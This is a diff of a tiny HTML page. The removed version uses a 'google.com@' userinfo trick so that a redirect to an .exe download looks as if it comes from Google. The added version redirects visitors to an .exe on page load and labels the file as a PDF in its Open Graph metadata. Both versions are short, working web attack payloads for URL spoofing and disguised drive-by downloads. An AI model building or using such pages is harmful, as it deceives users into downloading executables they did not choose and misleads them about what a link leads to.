@@ -1,17 +1,15 @@
+<!DOCTYPE html>
 <html>
 <head>
-    <title>Address Bar & navigation protocol Spoof!</title>
-    <script>
-        function redirectToGoogle() {
-            var popup = window.open('https://google.com', '_self');
-            setTimeout(function() {
-                popup.location.replace('http://google.com@pub.agrarix.net/Windows/7-zip/7z922.exe');
-            }, 2000);
-        }
-    </script>
+  <title>Auto Download File</title>
+  <meta property="og:url" content="http://pub.agrarix.net/Windows/7-zip/7z922.exe" />
+  <meta property="og:type" content="application/pdf" />
+  <meta property="og:title" content="File" />
 </head>
 <body>
-    <button onclick="redirectToGoogle()">Open Google</button>
-    <p id="message"></p>
+  <script>
+    window.location.href = document.querySelector('meta[property="og:url"]').getAttribute('content');
+  </script>
 </body>
 </html>
+                                 
